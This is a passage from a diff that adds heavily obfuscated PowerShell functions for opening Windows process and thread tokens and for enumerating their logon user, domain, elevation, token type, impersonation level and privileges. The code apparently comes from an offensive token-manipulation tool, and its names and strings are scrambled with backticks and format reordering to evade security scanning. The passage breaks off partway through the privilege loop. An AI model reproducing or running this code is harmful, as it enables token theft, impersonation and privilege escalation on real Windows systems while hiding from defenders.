+            ${fUL`lPR`IvS}
+        )
+
+        if (${f`ULlP`RivS})
+        {
+            ${TOk`ENP`RI`Vs} = ${wIn32Co`NsTa`NtS}."TOKEN_alL`_ACCE`Ss"
+        }
+        else
+        {
+            ${tokE`N`PR`iVs} = ${W`iN`32cONSt`AnTS}."T`OkeN`_ass`igN_PriMA`RY" -bor ${wI`N32cO`N`stanTS}."toK`EN`_DuplIcATe" -bor ${w`IN`32Co`NsT`AntS}."tok`EN_I`M`pe`RsON`ATE" -bor ${w`In3`2COnStA`N`Ts}."t`ok`EN`_QuErY" 
+        }
+
+        ${rE`TuR`NStRuct} = &("{2}{0}{3}{1}"-f 'w-','ect','Ne','Obj') ("{1}{0}" -f 'bject','PSO')
+
+        ${HP`Ro`cEss} = ${o`peN`PRoCEss}."I`N`VOke"(${Win32`Con`sTaN`TS}."PRoCeSS`_`quER`Y_`iNfORmAti`ON", ${t`RUe}, [UInt32]${PR`OCes`s`iD})
+        ${REtUr`Ns`Truct} | &("{1}{2}{0}" -f'ber','A','dd-Mem') -MemberType ("{0}{1}{2}" -f 'N','oteProper','ty') -Name ("{2}{1}{0}" -f 'rocess','P','h') -Value ${H`PrOce`sS}
+        if (${hpr`oC`eSs} -eq   ( &("{0}{3}{1}{2}{4}" -f'g','T-','C','E','HildITEm') ('varIaB'+'LE:s2'+'a'))."v`ALue"::"ze`Ro")
+        {
+            
+            ${e`RR`OrCOde} =  $kAJTe::("{0}{4}{2}{1}{3}"-f 'GetLastWi','2Er','3','ror','n').Invoke()
+            &("{0}{3}{1}{2}"-f 'W','e-Verb','ose','rit') "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process. "
+            return ${Nu`Ll}
+        }
+        else
+        {
+            [IntPtr]${h`p`RO`CtOkeN} =   (&("{0}{1}" -f 'G','et-itEm')  vARiaBLe:s2A)."VaL`Ue"::"Z`erO"
+            ${sUC`C`ess} = ${o`PeNProcE`Ss`To`k`eN}."i`N`VokE"(${HprO`C`ESS}, ${tok`enP`RI`Vs}, [Ref]${HPrOc`T`Ok`En})
+
+            
+            if (-not ${c`loS`e`hAnDle}."In`VoKe"(${hpR`O`cEss}))
+            {
+                ${ER`Ro`RcoDe} =   (  &("{0}{1}" -f 'di','R') VArIAblE:KaJte )."v`AlUE"::("{0}{2}{1}{3}"-f'GetLast','i','W','n32Error').Invoke()
+                &("{3}{2}{1}{0}" -f'g','n','-Warni','Write') ('Fai'+'led '+'to'+' '+'clos'+'e '+'proces'+'s '+'hand'+'l'+'e, '+'thi'+'s '+'i'+'s '+'un'+'expec'+'te'+'d. '+'Erro'+'r'+'Code: '+"$ErrorCode")
+            }
+            ${hPR`Oc`Ess} =   $s2a::"zE`RO"
+
+            if (${s`U`CcEss} -eq ${Fa`lSe} -or ${H`p`ROctOken} -eq   (&("{1}{0}{2}" -f 'E','G','T-VArIaBLe')  ("S2"+"A"))."v`AlUe"::"ZE`RO")
+            {
+                ${E`Rr`orCOde} =  (  &("{0}{1}"-f'v','ARIablE') ('K'+'AJTE')  -vALue)::("{0}{1}{3}{2}{5}{4}"-f 'G','etLa','W','st','or','in32Err').Invoke()
+                &("{2}{1}{0}"-f'g','nin','Write-War') "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode "
+                return ${n`ULL}
+            }
+            else
+            {
+                ${RET`U`R`NstRu`cT} | &("{0}{2}{1}{3}"-f 'Add','b','-Mem','er') -MemberType ("{2}{1}{0}{3}" -f 't','teProper','No','y') -Name ("{0}{2}{1}"-f 'hPro','n','cToke') -Value ${HPR`oc`TOKEN}
+            }
+        }
+
+        return ${RE`TU`RNStRUct}
+    }
+
+
+    function gET-Thr`E`ADTO`kEN
+    {
+        Param(
+            [Parameter(PoSiTIoN=0, MAnDAtOrY=${t`Rue})]
+            [UInt32]
+            ${t`HREAD`ID}
+        )
+
+        ${tO`ke`N`priVS} = ${wIN32cONS`T`ANTS}."T`OkeN_All_A`C`cE`ss"
+
+        ${ReTS`TRu`ct} = &("{2}{1}{0}"-f'ect','bj','New-O') ("{2}{1}{0}" -f 'ct','Obje','PS')
+        [IntPtr]${HtHR`eAd`TOKEN} =   ( &("{2}{0}{1}" -f'TE','m','ChIldI') VaRIABLE:s2a  )."vaL`UE"::"z`erO"
+
+        ${htHR`E`AD} = ${openT`h`R`eaD}."IN`Vo`kE"(${win3`2CO`NsTan`TS}."TH`READ_alL_a`c`cess", ${fA`l`Se}, ${TH`ReaDID})
+        if (${Ht`Hr`eaD} -eq  $S2a::"zE`Ro")
+        {
+            ${E`Rr`orcO`DE} =  ( &("{0}{1}" -f'VArIa','ble')  ("k"+"AjTE") -VALueoNlY)::("{3}{5}{0}{4}{1}{2}"-f'tWin3','E','rror','GetL','2','as').Invoke()
+            if (${E`R`ROrcode} -ne ${w`In3`2C`OnsTa`NtS}."e`RroR_InVAliD`_`PArA`M`eT`Er") 
+            {
+                &("{0}{1}{2}"-f'W','rite-Warn','ing') ('Fa'+'iled '+'t'+'o '+'op'+'en '+'thread'+' '+'han'+'dl'+'e '+'for'+' '+'Th'+'re'+'adId: '+"$ThreadId. "+'Error'+' '+'cod'+'e: '+"$ErrorCode")
+            }
+        }
+        else
+        {
+            ${S`UcCE`ss} = ${OpE`NtHREa`dtOk`eN}."IN`Voke"(${HTH`R`eAd}, ${T`okENPri`Vs}, ${f`Al`Se}, [Ref]${HTH`R`e`Ad`TOken})
+            if (-not ${SU`C`CESS})
+            {
+                ${eR`RorcO`de} =   $kAJTe::("{2}{1}{0}{3}"-f'tW','etLas','G','in32Error').Invoke()
+                if ((${err`o`RCo`DE} -ne ${wIn32`cons`T`A`Nts}."E`RroR`_NO`_tOKeN") -and  
+                 (${ErR`O`RcoDe} -ne ${wiN32COnST`AN`TS}."ERrOR_I`NvA`LiD`_PARAmET`er")) 
+                {
+                    &("{1}{0}{2}" -f 'ri','W','te-Warning') ('Faile'+'d '+'to'+' '+'cal'+'l '+'O'+'pen'+'Thread'+'To'+'ken '+'fo'+'r '+'Thr'+'e'+'adId: '+"$ThreadId. "+'Er'+'r'+'or '+'code:'+' '+"$ErrorCode")
+                }
+            }
+            else
+            {
+                &("{2}{3}{1}{0}" -f 'rbose','Ve','Writ','e-') ("{8}{7}{3}{1}{4}{0}{2}{6}{5}"-f' ','fully quer','thread ','ss','ied','oken','t','ucce','S')
+            }
+
+            
+            if (-not ${ClOS`eHAn`DLe}."I`NV`oKE"(${hthr`E`Ad}))
+            {
+                ${eRro`R`cO`DE} =   (  &("{0}{1}"-f 'D','iR') vaRiAbLe:KAjTE )."VA`lue"::("{4}{3}{0}{2}{1}" -f'tWi','rror','n32E','etLas','G').Invoke()
+                &("{0}{1}{2}"-f 'Write-Wa','rnin','g') ('F'+'ailed '+'to'+' '+'clos'+'e '+'th'+'read '+'h'+'and'+'le, '+'this'+' '+'is'+' '+'une'+'xpe'+'c'+'ted. '+'Er'+'rorC'+'ode: '+"$ErrorCode")
+            }
+            ${HtHR`e`AD} =  (&("{1}{2}{0}"-f 'IAbLe','V','AR') S2A  -VAlueo )::"ze`RO"
+        }
+
+        ${Re`TsT`Ru`ct} | &("{2}{0}{1}"-f 'Memb','er','Add-') -MemberType ("{1}{2}{0}"-f'roperty','Not','eP') -Name ("{3}{1}{0}{2}"-f'hr','T','eadToken','h') -Value ${htHrEA`DtO`KEN}
+        return ${RE`TST`RuCt}
+    }
+
+
+    
+    function gEt`-ToK`En`inF`oR`mATiOn
+    {
+        Param(
+            [Parameter(PoSItiON=0, maNdatORy=${tr`UE})]
+            [IntPtr]
+            ${hT`O`KeN}
+        )
+
+        ${rE`T`URNoBJ} = ${N`ULl}
+
+        ${to`ke`NSta`TssizE} =  $KaJtE::"SI`z`eoF"([Type]${T`oKEn`_sTAtiSTi`cS})
+        [IntPtr]${TokeNST`AT`SptR} =   $kAJTE::("{2}{0}{1}" -f'l','ocHGlobal','Al').Invoke(${toKeNSt`A`T`SSiZE})
+        [UInt32]${Re`Al`siZe} = 0
+        ${SUCC`EsS} = ${G`ET`TOkENiN`FOrMAtioN}."I`NvO`KE"(${HTOk`En}, ${TO`KEn`_InfOR`MA`TioN_clASS}::"tOKEn`StATiST`i`cS", ${t`O`KEnstaT`spTr}, ${t`O`KenST`Ats`SIZe}, [Ref]${rE`ALSi`Ze})
+        if (-not ${Su`c`cESs})
+        {
+            ${ErR`ORc`Ode} =  ( &("{0}{1}" -f 'd','ir')  ("vA"+"RiA"+"Ble:Kaj"+"Te"))."va`luE"::("{3}{4}{0}{1}{2}"-f 'tWin','32Err','or','G','etLas').Invoke()
+            &("{0}{3}{1}{2}" -f 'W','ar','ning','rite-W') ('GetToken'+'In'+'f'+'o'+'rm'+'ati'+'on '+'fai'+'l'+'ed. '+'E'+'rro'+'r '+'c'+'ode: '+"$ErrorCode")
+        }
+        else
+        {
+            ${t`OkeNs`TA`Ts} =  ( &("{1}{2}{0}" -f 'le','vaR','iab')  ('KAJT'+'e')  -ValueONly)::"PT`R`ToSTrUcTuRe"(${T`OK`ENS`Ta`TspTR}, [Type]${T`OKEn_`STA`TIStiCs})
+
+            
+            ${lUI`dP`Tr} =  (  &('ls') ('V'+'Ari'+'able:kA'+'jTE')  )."va`Lue"::("{0}{1}{2}"-f'Al','locHGloba','l').Invoke(  ( &("{0}{1}" -f'itE','m')  ('V'+'aRIaB'+'l'+'e:KA'+'JTe')  )."va`LUE"::"S`izEoF"([Type]${l`UiD}))
+             $KAjtE::("{1}{0}{2}{3}" -f 'ru','St','ctureToPt','r').Invoke(${t`OKe`NStAts}."aU`TheNTiC`AT`IONId", ${lUI`D`pTR}, ${Fa`l`se})
+
+            [IntPtr]${L`og`on`SEssiO`N`d`ATApTR} =  ( &("{1}{0}"-f 'cI','g') ("v"+"arIAblE:s2"+"a")  )."Va`lUe"::"z`ero"
+            ${R`eT`URN`Val} = ${lSAgEtLOGo`NSEssiOn`dA`TA}."I`Nv`oKe"(${l`UID`Ptr}, [Ref]${Lo`GonS`ESS`I`onDaTapTr})
+            if (${R`etu`R`NvAl} -ne 0 -and ${l`ogON`s`eS`sIo`NDa`TApTr} -eq   (  &("{2}{1}{0}" -f'e','aBL','vARI') S2A)."VaL`UE"::"ze`Ro")
+            {
+                &("{3}{2}{1}{0}" -f'-Warning','e','it','Wr') ('Ca'+'ll '+'to'+' '+'LsaG'+'e'+'tLogonSe'+'ssion'+'Data '+'fa'+'il'+'ed. '+'E'+'rr'+'or '+'c'+'ode: '+"$ReturnVal. "+'Logo'+'nS'+'essionD'+'ataPtr '+'= '+"$LogonSessionDataPtr")
+            }
+            else
+            {
+                ${logoNS`EsS`Io`N`DAtA} =   (&("{1}{3}{2}{0}" -f'eM','GEt','DIt','-chIl') varIABlE:kAJtE )."V`AluE"::"pT`RtOst`RU`CtURe"(${LOGONsES`s`io`N`daTapTR}, [Type]${Se`CUritY_lO`Go`N_sEssio`N_D`AtA})
+                if (${LO`g`ON`sEs`siOn`daTA}."us`eR`NaMe"."BU`F`FER" -ne  (&("{2}{1}{0}"-f 'teM','et-i','G')  ("VA"+"rIABL"+"E:S2A") )."V`Alue"::"Z`ero" -and 
+                    ${log`oNS`e`SSIoNDAtA}."LoGi`N`domaIN"."Bu`FfEr" -ne  (&("{1}{0}{3}{2}" -f'var','get-','le','IAB')  ("s"+"2a")  -Va  )::"Z`ero")
+                {
+                    
+                    ${US`E`RNaMe} =   $kajTE::("{1}{0}{3}{2}{4}"-f 'rTo','Pt','gU','Strin','ni').Invoke(${L`oGo`NseS`siOnDa`Ta}."U`ser`NaME"."Buff`ER", ${Lo`go`NS`E`S`sIOndatA}."u`Se`RnaMe"."L`ength"/2)
+                    ${do`ma`IN} =  (&("{2}{1}{0}{3}"-f 'AR','-v','Get','iAbLe')  ('KAj'+'Te') )."v`ALUe"::("{2}{1}{3}{0}"-f 'Uni','trTo','P','String').Invoke(${lO`GO`Ns`EsSIoND`Ata}."LoG`InDOma`iN"."BUFF`Er", ${lOG`o`N`SE`sSIoNd`AtA}."lo`gindo`mAiN"."l`engTh"/2)
+
+                    
+                    
+                    
+                    if (${u`s`eRnAMe} -ieq "$($env:COMPUTERNAME)`$")
+                    {
+                        [UInt32]${si`ze} = 100
+                        [UInt32]${nUMUse`R`Nam`echaR} = ${S`iZE} / 2
+                        [UInt32]${NU`mDOMAIN`cHAr} = ${Si`zE} / 2
+                        [UInt32]${SID`Na`MeUSe} = 0
+                        ${u`s`ERN`AMe`BufFER} =  ( &("{1}{3}{0}{2}"-f'vaRiaBL','gET','E','-') kAjTE  -vAL  )::("{1}{3}{0}{2}"-f 'o','Alloc','bal','HGl').Invoke(${SI`zE})
+                        ${D`OmAi`N`BuffER} =  (&("{1}{0}" -f 'em','IT') ("va"+"RiABle:k"+"A"+"jte")  )."v`AluE"::("{0}{2}{3}{1}" -f 'Allo','al','c','HGlob').Invoke(${S`Ize})
+                        ${Su`Cce`sS} = ${lO`okuP`A`CCOU`N`TSiDw}."invO`ke"( ( &("{2}{0}{1}{3}" -f'ET','-v','G','ariABLE') ("S"+"2A")  -VAlue)::"Ze`Ro", ${l`o`g`onse`S`sioNdaTA}."S`Id", ${u`ser`NAM`eBUFFEr}, [Ref]${N`UmuSe`R`N`AmEChAr}, ${dom`AIN`Bu`Ff`eR}, [Ref]${N`UMDOmAI`NcHar}, [Ref]${s`IDNa`me`USE})
+
+                        if (${sU`CCeSS})
+                        {
+                            ${u`serna`ME} =   $KaJtE::("{2}{0}{1}" -f'ringUn','i','PtrToSt').Invoke(${u`sERN`A`meBUFFeR})
+                            ${Do`maIn} =  $KAJTe::("{3}{4}{1}{0}{2}" -f 'ri','ToSt','ngUni','P','tr').Invoke(${DOm`AinbuFF`ER})
+                        }
+                        else
+                        {
+                            ${E`R`RoRcoDE} =   $kaJTe::("{1}{0}{3}{2}"-f'etL','G','stWin32Error','a').Invoke()
+                            &("{2}{3}{0}{1}"-f'ni','ng','Write-W','ar') ('E'+'rror '+'callin'+'g '+'Loo'+'kupA'+'c'+'coun'+'t'+'SidW. '+'E'+'rror '+'co'+'de: '+"$ErrorCode")
+                        }
+
+                          $KAjtE::("{1}{2}{0}" -f 'lobal','Fr','eeHG').Invoke(${use`R`NAmEbUfFeR})
+                        ${Use`RNA`Me`BuFf`er} =  $S2A::"ze`RO"
+                          $KAJTE::("{2}{1}{0}"-f'lobal','eeHG','Fr').Invoke(${Dom`AINb`U`FFEr})
+                        ${DomaI`N`B`UFfER} =   $S2a::"zE`RO"
+                    }
+
+                    ${ReTu`R`NobJ} = &("{0}{1}{2}" -f 'N','e','w-Object') ("{2}{1}{0}"-f 'Object','S','P')
+                    ${R`ETu`RnoBj} | &("{1}{0}{2}" -f 'dd-Membe','A','r') -Type ("{2}{1}{0}{3}"-f'Propert','e','Not','y') -Name ("{2}{1}{0}"-f 'n','omai','D') -Value ${dOma`iN}
+                    ${R`E`TURn`obJ} | &("{3}{2}{1}{0}"-f'mber','e','d-M','Ad') -Type ("{0}{1}{2}{3}" -f 'N','oteProp','ert','y') -Name ("{0}{1}" -f 'User','name') -Value ${u`sErN`AMe}    
+                    ${re`TUR`NoBj} | &("{1}{0}{2}" -f'mbe','Add-Me','r') -Type ("{0}{2}{1}"-f'N','erty','oteProp') -Name ("{1}{0}" -f'ken','hTo') -Value ${Ht`OK`en}
+                    ${r`eTuRNo`Bj} | &("{0}{2}{3}{1}" -f'Ad','r','d-M','embe') -Type ("{3}{1}{2}{0}"-f 'y','r','t','NotePrope') -Name ("{1}{0}{2}"-f 'p','LogonTy','e') -Value ${L`O`GoNsESS`IoNDAta}."log`O`NTYPe"
+
+
+                    
+                    ${r`eT`UrnObJ} | &("{2}{0}{1}" -f'emb','er','Add-M') -Type ("{1}{2}{0}"-f 'roperty','Note','P') -Name ("{2}{1}{0}" -f 'ated','v','IsEle') -Value ${fa`LSe}
+
+                    ${t`ok`EneLeV`A`T`IONSIZE} =   $kaJTe::"si`ZEoF"([Type]${Tok`EN_eL`Ev`ATion})
+                    ${T`oKeneleVatI`ON`PTr} =  (  &("{1}{2}{0}"-f'E','VArIAb','L')  ("KaJ"+"Te")  -va )::("{2}{1}{0}{3}" -f'cHG','o','All','lobal').Invoke(${tOk`En`EleVATIons`iZE})
+                    [UInt32]${R`E`A`lSizE} = 0
+                    ${Suc`Ce`sS} = ${Gett`oKE`NI`N`FoRMatioN}."in`V`OKE"(${Ht`oK`eN}, ${tOkeN_i`NFoR`MATiON`_`c`LASs}::"t`O`kEnEL`e`VatIoN", ${TO`KeNe`LEvA`TIO`NPtR}, ${TOkeNelE`VA`TionS`I`ze}, [Ref]${REAlS`i`zE})
+                    if (-not ${S`UcCe`sS})
+                    {
+                        ${ErrO`R`coDe} =  (  &('Gi')  ("VA"+"Riable:"+"k"+"aJte")  )."VAL`UE"::("{2}{3}{1}{4}{0}"-f'rror','astWin32','Ge','tL','E').Invoke()
+                        &("{2}{3}{0}{1}" -f'n','ing','W','rite-War') ('GetTokenInf'+'orm'+'a'+'tion '+'fa'+'iled '+'t'+'o '+'re'+'trie'+'ve '+'To'+'kenE'+'levat'+'io'+'n '+'status'+'. '+'E'+'r'+'rorCode: '+"$ErrorCode") 
+                    }
+                    else
+                    {
+                        ${TO`kenEle`V`ATi`oN} =   $kaJte::"p`T`RTost`R`UCTure"(${To`kEn`El`evatioNptR}, [Type]${T`OKEn_eLe`VA`T`i`oN})
+                        if (${toKEn`E`L`EvAt`ion}."tO`KenIS`ELevAT`ED" -ne 0)
+                        {
+                            ${ret`UrNo`BJ}."ISeLe`VA`TeD" = ${Tr`Ue}
+                        }
+                    }
+                      $KAjte::("{1}{2}{0}"-f'eeHGlobal','F','r').Invoke(${tOKeN`elEVat`IOn`ptR})
+
+
+                    
+                    ${RE`TUR`NoBJ} | &("{2}{0}{1}"-f 'Me','mber','Add-') -Type ("{1}{3}{2}{0}" -f'operty','No','ePr','t') -Name ("{0}{1}{2}"-f 'Toke','n','Type') -Value ("{0}{3}{1}{2}{4}"-f'Un','bleT','oRetriev','a','e')
+
+                    [UInt32]${T`oKE`NtyPEsiZe} = 4
+                    [IntPtr]${t`OkENt`y`Pep`TR} =   (&("{3}{0}{2}{1}" -f't','aBlE','-vArI','ge')  ('KaJT'+'e')  )."v`AluE"::("{1}{0}{2}{3}"-f'Glo','AllocH','ba','l').Invoke(${T`ok`enTYp`esi`ze})
+                    [UInt32]${R`E`ALSIZE} = 0
+                    ${SU`ccesS} = ${Ge`T`TOkenI`N`FoR`matIoN}."I`N`VOKE"(${Hto`k`eN}, ${To`Ken_InFOR`mAti`O`N_CLA`sS}::"t`OkEn`TY`PE", ${toKEN`Typ`eptr}, ${t`OKeNTYPE`SiZe}, [Ref]${realSI`ze})
+                    if (-not ${SuC`C`ESS})
+                    {
+                        ${e`RRORC`ODe} =   (  &("{1}{0}{2}{3}" -f'eT-','g','vaRIABL','e') kAjte -vaLUE)::("{2}{1}{4}{0}{3}{5}"-f 'n3','L','Get','2Er','astWi','ror').Invoke()
+                        &("{2}{0}{1}"-f '-Warni','ng','Write') ('Get'+'TokenI'+'nfo'+'rm'+'ation '+'f'+'ailed '+'to'+' '+'retr'+'ieve'+' '+'Token'+'Impersonati'+'on'+'Level'+' '+'st'+'atus. '+'ErrorCode'+':'+' '+"$ErrorCode")
+                    }
+                    else
+                    {
+                        [UInt32]${TOk`E`NT`YPe} =   (&("{0}{2}{3}{1}"-f 'GEt','le','-','VARIAb')  KaJte -Va  )::"p`TRtOstr`UcturE"(${tokEn`T`Y`P`ePTr}, [Type][UInt32])
+                        switch(${T`OK`enTYpE})
+                        {
+                            1 {${rEtu`Rn`OBJ}."tO`K`eNtype" = ("{1}{0}"-f 'mary','Pri')}
+                            2 {${ReT`Ur`NObj}."to`KEnT`ypE" = ("{0}{3}{1}{2}" -f'Imper','atio','n','son')}
+                        }
+                    }
+                     (  &("{0}{1}{3}{2}" -f'C','HILd','em','IT') VARiABLE:KaJtE )."vaL`Ue"::("{0}{1}{2}" -f 'F','ree','HGlobal').Invoke(${toK`ENT`YpeP`Tr})
+
+
+                    
+                    if (${Re`TURN`OBJ}."TOKeNT`y`pE" -ieq ("{2}{0}{3}{4}{1}" -f'so','ion','Imper','n','at'))
+                    {
+                        ${ret`UrnO`Bj} | &("{1}{0}{2}"-f'-','Add','Member') -Type ("{2}{0}{1}" -f 'ePropert','y','Not') -Name ("{3}{0}{2}{1}"-f'mpersona','l','tionLeve','I') -Value ("{2}{0}{1}{3}{4}" -f'ab','leToRe','Un','tr','ieve')
+
+                        [UInt32]${Impe`R`so`NaT`i`ONlEvelsIZe} = 4
+                        [IntPtr]${i`Mpe`Rs`on`AtiONL`eV`eLPTr} =  $KajTe::("{3}{2}{1}{0}" -f 'bal','HGlo','lloc','A').Invoke(${Im`PE`RSo`NaTIo`NlE`VE`lSize}) 
+                        [UInt32]${RE`AlS`I`ze} = 0
+                        ${sUC`CESS} = ${g`E`TTOKENInF`Or`matIon}."iNV`OKE"(${hto`KEn}, ${To`kE`N_`INfORmaTIOn_clA`ss}::"t`OKeNIM`P`E`RS`OnaTIONle`VEL", ${i`mpeR`son`A`Ti`oNl`eVElPtR}, ${Im`PerSonatiOn`leVE`L`siZe}, [Ref]${rEA`Ls`i`zE})
+                        if (-not ${sU`cc`ESS})
+                        {
+                            ${E`RROr`cODE} =  ( &("{1}{0}{2}" -f'hilD','C','ITeM')  ("V"+"Ari"+"AbLe:KAJ"+"t"+"E") )."vA`LuE"::("{0}{1}{2}{3}"-f'GetLast','Win32','Err','or').Invoke()
+                            &("{3}{0}{2}{1}"-f'e-W','g','arnin','Writ') ('G'+'e'+'tTokenIn'+'fo'+'rmat'+'ion'+' '+'fai'+'led '+'t'+'o '+'retr'+'ieve'+' '+'TokenImp'+'erso'+'nation'+'L'+'evel '+'sta'+'tus.'+' '+'ErrorCode'+':'+' '+"$ErrorCode")
+                        }
+                        else
+                        {
+                            [UInt32]${IMP`E`RsONAt`IONlE`VEL} =  ( &("{1}{0}{2}"-f 'Ia','geT-vAr','blE') kaJtE )."vAl`Ue"::"PTr`TOStRu`Ctu`Re"(${ImpersOnaTIo`N`l`EVEL`PTr}, [Type][UInt32])
+                            switch (${I`m`pe`R`sOnATIoN`leVel})
+                            {
+                                0 { ${re`TURn`oBj}."ImPERsOnAtI`ON`L`EVeL" = ("{2}{1}{0}{3}" -f'r','u','Sec','ityAnonymous') }
+                                1 { ${retUr`No`Bj}."iMp`ers`onatiOnle`Vel" = ("{3}{0}{2}{5}{1}{4}" -f 'ty','i','Identi','Securi','cation','f') }
+                                2 { ${ReT`U`RNObj}."IM`Per`SONatIOnLe`V`EL" = ("{2}{3}{0}{1}" -f 'curityImperson','ation','S','e') }
+                                3 { ${r`Et`UrNObj}."imPE`R`S`oNATionl`EveL" = ("{5}{3}{2}{0}{4}{1}" -f'elegati','n','D','y','o','Securit') }
+                            }
+                        }
+                         ( &("{0}{1}{2}{3}" -f'GE','t-vA','r','iabLe') kajte  -VALUEO  )::("{1}{0}{2}" -f'oba','FreeHGl','l').Invoke(${IMPe`R`sonA`T`i`OnLeVelpTr})
+                    }
+
+
+                    
+                    ${Retur`N`oBj} | &("{2}{1}{0}"-f 'd-Member','d','A') -Type ("{2}{1}{0}" -f'Property','ote','N') -Name ("{1}{0}" -f'nID','Sessio') -Value ("{0}{1}" -f'Unk','nown')
+
+                    [UInt32]${to`Ke`NsEssiOni`ds`izE} = 4
+                    [IntPtr]${toK`eNSess`IOnI`dPTR} =  ( &("{1}{0}{3}{2}" -f 'E','G','Le','T-vARiab')  ('kaJ'+'te'))."va`Lue"::("{1}{2}{0}" -f 'Global','Alloc','H').Invoke(${TO`KEnseSSiOni`d`Size})
+                    [UInt32]${Real`Size} = 0
+                    ${sUCCE`SS} = ${gE`TtO`kE`N`INfo`RmAtION}."In`Voke"(${H`TO`keN}, ${to`kE`N_`INFOR`m`ATiON_cLASS}::"TO`K`ENsEssiONid", ${to`K`ENs`ESSion`I`dPTR}, ${tOkEn`s`eSSiONiD`S`I`ze}, [Ref]${Real`S`IzE})
+                    if (-not ${S`UCc`eSs})
+                    {
+                        ${Err`Orco`de} =   ( &("{1}{0}"-f'lE','vaRIAb')  kAjTE -ValUeO)::("{2}{4}{5}{1}{3}{0}"-f'or','n32Er','Ge','r','tLas','tWi').Invoke()
+                        &("{1}{3}{0}{4}{2}"-f'arn','Writ','ng','e-W','i') ('GetTokenInf'+'o'+'rmati'+'on '+'faile'+'d '+'t'+'o '+'r'+'et'+'rieve '+'Tok'+'e'+'n '+'Ses'+'sionI'+'d. '+'Err'+'or'+'Co'+'de: '+"$ErrorCode")
+                    }
+                    else
+                    {
+                        [UInt32]${TO`keNS`ESsIoNId} =  $kAJTe::"PTRt`O`sT`RuCtUrE"(${to`kENSe`SS`Io`Nid`Ptr}, [Type][UInt32])
+                        ${rET`U`R`NoBJ}."SESs`i`ONId" = ${t`OKe`N`Se`SsIOnid}
+                    }
+                      $kaJTe::("{2}{0}{3}{1}" -f 'eH','bal','Fre','Glo').Invoke(${t`OKe`NSESsio`NIDP`Tr})
+
+
+                    
+                    ${R`e`Tu`RnOBJ} | &("{2}{3}{1}{0}" -f 'r','e','Add-M','emb') -Type ("{2}{1}{0}" -f 'y','opert','NotePr') -Name ("{1}{2}{0}{3}"-f'ab','Privile','gesEn','led') -Value @()
+                    ${RE`TURN`obJ} | &("{0}{2}{1}"-f 'Ad','Member','d-') -Type ("{3}{1}{2}{0}" -f'rty','tePro','pe','No') -Name ("{0}{4}{3}{1}{2}"-f 'Pri','sAvail','able','ilege','v') -Value @()
+
+                    [UInt32]${t`okE`Np`RIv`ileGE`sSize} = 1000
+                    [IntPtr]${T`OK`eNPr`iVIlEG`E`sptr} =   $KaJtE::("{1}{3}{2}{0}"-f'bal','A','locHGlo','l').Invoke(${TOK`e`Npr`iV`ilEgeS`SizE})
+                    [UInt32]${REaL`sIZe} = 0
+                    ${s`UC`cEsS} = ${g`ETtOk`en`iNFo`RmaTi`on}."i`NVO`KE"(${h`TOKEN}, ${T`O`k`EN_`In`FOR`mA`TiOn_cLaSs}::"tO`kE`NPRIv`IL`EGeS", ${T`okENPR`ivi`LegeS`pTR}, ${TOK`EN`pRI`VILeG`esSIZE}, [Ref]${Re`Al`sIzE})
+                    if (-not ${su`CCESs})
+                    {
+                        ${ERrO`Rc`Ode} =   (  &("{1}{0}{2}" -f'RIab','Va','lE')  Kajte  -ValuEoNl )::("{4}{1}{0}{3}{2}"-f 'n32','etLastWi','rror','E','G').Invoke()
+                        &("{1}{4}{0}{2}{3}"-f '-War','W','nin','g','rite') ('G'+'e'+'tToke'+'nInfor'+'ma'+'tion '+'fai'+'led'+' '+'t'+'o '+'retriev'+'e'+' '+'Tok'+'e'+'n '+'S'+'e'+'ssi'+'onId. '+'E'+'rrorCode:'+' '+"$ErrorCode")
+                    }
+                    else
+                    {
+                        ${tOKe`NP`R`i`VILEGEs} =   (  &("{2}{1}{3}{0}" -f 'IabLe','eT-v','G','AR')  ("ka"+"jtE")  -VALueo  )::"pT`Rtos`TructU`Re"(${tOkEnP`R`IvIl`eg`E`SPtR}, [Type]${t`oken`_PrIv`iLeGeS})
+                        
+                        
+                        [IntPtr]${PRI`V`ilEGES`BASEp`Tr} = [IntPtr](&("{0}{4}{2}{3}{1}" -f 'Add-Sign','AsUnsigned','I','nt','ed') ${tO`keNPRIVIleG`eSp`TR} (  (  &("{0}{1}" -f'it','Em') ('Varia'+'Bl'+'E:KAjtE') )."v`ALue"::"OfFs`eT`Of"([Type]${t`OKEN_p`RIv`il`egEs}, ("{1}{0}{2}"-f'ivileg','Pr','es'))))
+                        ${LU`idandAttR`IBu`TEs`I`Ze} =  (  &("{3}{2}{0}{1}" -f '-vAriA','bLe','t','Ge')  kaJTE )."v`ALuE"::"SizE`Of"([Type]${LUId_`A`N`d_AT`T`RiBUt`Es})
+                        for (${i} = 0; ${i} -lt ${tOkeNpr`IV`Il`EGes}."Pr`IvI`lEgECou`NT"; ${i}++)
+                        {
+                            ${L`U`iD`AN`DatTR`Ibute`pTR} = [IntPtr](&("{6}{5}{3}{1}{2}{4}{0}" -f 'signed','nedI','ntAsU','Sig','n','d-','Ad') ${P`RivilEg`EsB`ASEp`Tr} (${LuidanD`A`TtRi`B`Ute`S`ize} * ${i}))
+
+                            ${lu`iDa`NDA`T`TRibUte} =  $kajtE::"P`TrTOsT`R`UCT`URe"(${L`UIdanDAtt`R`IbUtepTR}, [Type]${luiD_a`N`D_aT`TR`iButes})
+
+                            
+                            [UInt32]${pRIvIl`EG`enAm`eSi`ze} = 60
+                            ${PRIvil`EGE`Nam`E`PTr} =  $kaJTE::("{2}{1}{0}"-f'l','HGloba','Alloc').Invoke(${PRiV`IL`e`GenaMEsIZE})
+                            ${Pl`U`Id} = ${LuID`AnDAtt`RI`B`UtEPTR} 
+
+                            ${Su`c`ceSs} = ${lOOk`UP`p`RivIL`EGE`NamEw}."inVO`KE"( (  &("{1}{0}" -f 'm','ITE') ('vAR'+'Ia'+'BlE:S2A'))."Val`Ue"::"z`ero", ${p`lU`id}, ${Pri`ViL`eGEn`AmeptR}, [Ref]${p`Ri`ViLEg`EN`AmEs`IzE})
+                            if (-not ${S`UCce`sS})
+                            {
+                                ${eR`R`oRCode} =   $kaJte::("{0}{1}{2}{3}{4}"-f 'G','e','t','La','stWin32Error').Invoke()
